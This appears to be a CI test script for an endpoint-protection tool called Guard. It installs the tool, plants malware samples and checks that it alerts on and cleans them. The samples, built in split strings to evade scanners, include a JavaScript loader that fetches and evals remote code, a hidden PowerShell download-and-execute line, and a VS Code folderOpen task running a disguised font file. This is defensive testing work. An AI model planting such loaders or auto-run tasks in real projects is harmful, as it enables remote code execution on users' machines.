#!/usr/bin/env bash
# Runs Guard's real installers on a CI runner (Linux or macOS) against a guard
# binary built from this commit, then checks the installed Guard works:
#
#   1. ./install.sh (source install): binary in ~/.guard/bin, git hooks, config
#      and the per-user service (systemd --user / LaunchAgent).
#   2. docs/guard.sh, the one-liner users pipe into `sudo bash`, served from a
#      local web server so it downloads this build instead of the latest release.
#
# For each: the service runs, the watcher alerts on a malicious file dropped in
# ~/Downloads, malware already in ~/Downloads before the install is found by
# the first-start scan, a reinstall over the running service works, and
# uninstall removes the service.
#
#   check-unix.sh <path to guard binary>
set -euo pipefail

BIN="$(cd "$(dirname "$1")" && pwd)/$(basename "$1")"
SRC="$(cd "$(dirname "$0")/../.." && pwd)"
OS="$(uname -s)"
WORK="${RUNNER_TEMP:-/tmp}/guard-installer"
LABEL=me.syedbipul.guard
rm -rf "$WORK"; mkdir -p "$WORK" "$HOME/Downloads"

step() { echo; echo "::group::$*"; }
end() { echo "::endgroup::"; }
fail() { echo "::error::$*"; exit 1; }

# wait_for <seconds> <description> <command...>: retry until the command succeeds
wait_for() {
    local secs=$1 what=$2; shift 2
    for _ in $(seq "$secs"); do
        "$@" >/dev/null 2>&1 && return 0
        sleep 1
    done
    fail "timed out after ${secs}s waiting for: $what"
}

# The incident's loader, split so no line of this file carries it whole (the
# detection tests sweep the repository).
drop_payload() {
    printf '%s\n' "const a = 1;" "(async () => {" \
        "  const src = at""ob(process.env.AUTH_API_KEY);" \
        "  const proxyInfo = await (await fetch(src)).text();" \
        "  eval(proxy""Info);" "})();" > "$1"
}

# check_watcher <sudo or ""> <guard home>: once the service is up, a malicious
# file dropped into ~/Downloads raises an alert.
check_watcher() {
    local as=$1 home=$2 name f
    wait_for 60 "the watcher to start ($home/watcher.log)" \
        $as grep -q "native file events\|polling every" "$home/watcher.log"
    wait_for 120 "the watcher to finish its first pass" \
        $as grep -q "primed\|native file events" "$home/watcher.log"
    sleep 2
    name="guard-ci-$RANDOM$RANDOM.js"
    f="$HOME/Downloads/$name"
    drop_payload "$f"
    if ! wait_for_alert "$as" "$home" "$name"; then
        $as tail -n 50 "$home/watcher.log" || true
        fail "no alert for $f in $home/alerts.jsonl"
    fi
    echo "watcher alerted on $name"
    rm -f "$f"
    # an npm install of a malicious package into a project
    drop_dependency "$HOME/Projects/${name%.js}-app"
    echo '{"lockfileVersion": 3}' > "$HOME/Projects/${name%.js}-app/package-lock.json"
    check_dependency "$as" "$home" "$HOME/Projects/${name%.js}-app" "installed while Guard runs"
    rm -rf "$HOME/Projects/${name%.js}-app"
}
# A downloader script: not a type the watcher's supply-chain checks read, so
# only the antivirus engine catches it. Split like the loader above.
drop_downloader() {
    printf '%s\n' "powershell -WindowStyle Hid""den -ExecutionPolicy By""pass -c \"IEX (New-Object Net.WebClient).Download""String('http://example.invalid/a')\"" > "$1"
}

# An already-infected machine: malware in ~/Downloads and in a project's
# installed dependencies before Guard is installed is found by the watcher's
# first-start scan.
PRE="guard-preinstalled-$RANDOM$RANDOM"
plant_preinstalled() {
    drop_payload "$HOME/Downloads/$PRE.js"
    drop_downloader "$HOME/Downloads/$PRE.ps1"
    drop_dependency "$HOME/Projects/$PRE-app"
}
# drop_dependency <project>: an installed npm package carrying the loader
drop_dependency() {
    mkdir -p "$1/node_modules/bad-dep"
    echo '{"name": "app", "dependencies": {"bad-dep": "1.0.0"}}' > "$1/package.json"
    echo '{"name": "bad-dep", "version": "1.0.0"}' > "$1/node_modules/bad-dep/package.json"
    drop_payload "$1/node_modules/bad-dep/index.js"
}
# check_dependency <sudo or ""> <guard home> <project> <what>: an alert for
# the project's node_modules, and the loader cut out of the package
check_dependency() {
    local as=$1 home=$2 app=$3 dep="$3/node_modules/bad-dep/index.js"
    if ! wait_for_alert "$as" "$home" "$(basename "$app")/node_modules"; then
        $as tail -n 50 "$home/watcher.log" || true
        fail "no alert for $app/node_modules ($4)"
    fi
    wait_for 60 "the loader cut out of $dep" sh -c "! grep -q 'eval(proxy''Info)' '$dep'"
    echo "watcher alerted on and cleaned $app/node_modules ($4)"
}
check_preinstalled() {   # <sudo or ""> <guard home>
    local as=$1 home=$2 f
    for f in "$PRE.js" "$PRE.ps1"; do
        if ! wait_for_alert "$as" "$home" "$f"; then
            $as tail -n 50 "$home/watcher.log" || true
            fail "the first-start scan raised no alert for $HOME/Downloads/$f, there before the install"
        fi
        echo "first-start scan alerted on $f"
    done
    check_dependency "$as" "$home" "$HOME/Projects/$PRE-app" "there before the install"
    wait_for 300 "the initial scan to finish ($home/watcher.log)" \
        $as grep -q "initial scan complete" "$home/watcher.log"
}
wait_for_alert() {
    for _ in $(seq 120); do
        $1 grep -q "$3" "$2/alerts.jsonl" 2>/dev/null && return 0
        sleep 1
    done
    return 1
}

service_running() {   # <user|system>
    case "$OS:$1" in
        Linux:user)    systemctl --user is-active --quiet guard.service ;;
        Linux:system)  systemctl is-active --quiet guard.service ;;
        Darwin:*)      launchctl print "gui/$(id -u)/$LABEL" | grep -q "state = running" ;;
    esac
}
# launchd and systemd report a just-started service as still spawning for a
# moment, so give it time before calling it down
service_up() {        # <user|system>
    for _ in $(seq 30); do
        service_running "$1" && return 0
        sleep 1
    done
    return 1
}
service_gone() {      # <user|system>
    case "$OS:$1" in
        Linux:user)    ! systemctl --user is-active --quiet guard.service \
                         && [ ! -e "$HOME/.config/systemd/user/guard.service" ] ;;
        Linux:system)  ! systemctl is-active --quiet guard.service \
                         && [ ! -e /etc/systemd/system/guard.service ] ;;
        Darwin:*)      ! launchctl print "gui/$(id -u)/$LABEL" >/dev/null 2>&1 ;;
    esac
}
show_service() {
    case "$OS:$1" in
        Linux:user)    systemctl --user status guard.service --no-pager || true ;;
        Linux:system)  systemctl status guard.service --no-pager || true ;;
        Darwin:*)      launchctl print "gui/$(id -u)/$LABEL" || true ;;
    esac
}

# ------------------------------------------------------------ 1. ./install.sh
if [ "$OS" = Linux ]; then
    # a CI runner has no login session, so start the user's systemd manager
    # the way a desktop login would
    sudo loginctl enable-linger "$USER"
    export XDG_RUNTIME_DIR="/run/user/$(id -u)"
    wait_for 30 "the systemd user manager" test -S "$XDG_RUNTIME_DIR/bus"
fi

step "install.sh"
plant_preinstalled
GUARD_BIN="$BIN" "$SRC/install.sh"
end
step "install.sh: check the install"
"$HOME/.guard/bin/guard" version
[ -s "$HOME/.guard/watcher.config.json" ] || fail "install.sh wrote no watcher.config.json"
[ "$(git config --global --get core.hooksPath)" = "$HOME/.guard/githooks" ] \
    || fail "install.sh did not set the global git hooks"
service_up user || { show_service user; fail "the watcher service is not running"; }
check_preinstalled "" "$HOME/.guard"
check_watcher "" "$HOME/.guard"
end

step "install.sh: git hooks warn on a clone with a folderOpen task"
repo="$WORK/bad-repo"
font="public/fonts/fa-solid-400.wo""ff2"
mkdir -p "$repo/.vscode" "$repo/public/fonts"
printf '{"version": "2.0.0", "tasks": [{"label": "boot", "type": "shell", "command": "node",\n' > "$repo/.vscode/tasks.json"
printf ' "args": ["./'"$font"'"], "runOptions": {"runOn": "folder''Open"}}]}\n' >> "$repo/.vscode/tasks.json"
printf 'const x = 1;\n' > "$repo/$font"
git -C "$repo" init -q
git -C "$repo" -c user.name=ci -c user.email=ci@example.com add -A
git -C "$repo" -c user.name=ci -c user.email=ci@example.com commit -qm bad
git clone -q "$repo" "$WORK/bad-clone" 2> "$WORK/clone.err" || { cat "$WORK/clone.err"; fail "the hook broke git clone"; }
cat "$WORK/clone.err"
grep -q "\[GUARD\] WARNING" "$WORK/clone.err" || fail "the post-checkout hook raised no warning"
end

step "install.sh: reinstall over the running service"
GUARD_BIN="$BIN" "$SRC/install.sh"
wait_for 30 "the service to run again" service_running user
end

step "install.sh --uninstall"
"$SRC/install.sh" --uninstall
wait_for 30 "the service to stop" service_gone user
[ -z "$(git config --global --get core.hooksPath || true)" ] || fail "uninstall left core.hooksPath set"
end

# ---------------------------------------------------- 2. docs/guard.sh one-liner
case "$OS:$(uname -m)" in
    Linux:x86_64) plat=linux-x64 ;;   Linux:aarch64) plat=linux-arm64 ;;
    Darwin:arm64) plat=darwin-arm64 ;; *) fail "no release asset for $OS $(uname -m)" ;;
esac
sha() { if command -v sha256sum >/dev/null; then sha256sum "$1"; else shasum -a 256 "$1"; fi | awk '{print $1}'; }
mkdir -p "$WORK/www/good" "$WORK/www/bad"
cp "$BIN" "$WORK/www/good/guard-$plat"
echo "$(sha "$BIN")  guard-$plat" > "$WORK/www/good/guard-$plat.sha256"
cp "$BIN" "$WORK/www/bad/guard-$plat"
echo "0000000000000000000000000000000000000000000000000000000000000000  guard-$plat" \
    > "$WORK/www/bad/guard-$plat.sha256"
python3 -m http.server 8765 --bind 127.0.0.1 --directory "$WORK/www" >"$WORK/http.log" 2>&1 &
http_pid=$!
trap 'kill $http_pid 2>/dev/null || true' EXIT
wait_for 30 "the local release server" curl -fsS -o /dev/null "http://127.0.0.1:8765/good/guard-$plat.sha256"

# run the script the way the README does: piped into sudo bash
one_liner() { sudo env GUARD_BASE_URL="http://127.0.0.1:8765/$1" bash < "$SRC/docs/guard.sh"; }

step "guard.sh refuses a binary whose checksum does not match"
if one_liner bad; then fail "guard.sh installed a binary with a wrong checksum"; fi
[ ! -e /usr/local/bin/guard ] || fail "guard.sh left /usr/local/bin/guard after a checksum mismatch"
end

step "guard.sh"
# the root service on Linux starts from a fresh /var/lib/guard, so its first
# start scans again; on macOS it reuses the ~/.guard install.sh left
PRE="guard-preinstalled-$RANDOM$RANDOM"
[ "$OS" = Linux ] && plant_preinstalled
one_liner good
end
step "guard.sh: check the install"
/usr/local/bin/guard version
if [ "$OS" = Linux ]; then
    sys_home=/var/lib/guard
    sudo test -s $sys_home/install.json || fail "guard install wrote no install.json"
    sudo grep -q "$HOME/Downloads" $sys_home/watcher.config.json \
        || fail "the root service does not watch $HOME/Downloads"
    service_up system || { show_service system; fail "guard.service is not running"; }
    check_preinstalled sudo $sys_home
    check_watcher sudo $sys_home
else
    [ -f "/Library/LaunchAgents/$LABEL.plist" ] || fail "guard install wrote no LaunchAgent"
    wait_for 30 "the launch agent to run" service_running agent
    check_watcher "" "$HOME/.guard"
fi
end

step "guard.sh: reinstall over the running service"
one_liner good
wait_for 30 "the service to run again" service_running system
end

step "guard uninstall"
sudo /usr/local/bin/guard uninstall
wait_for 30 "the service to stop" service_gone system
end
echo "installers OK"
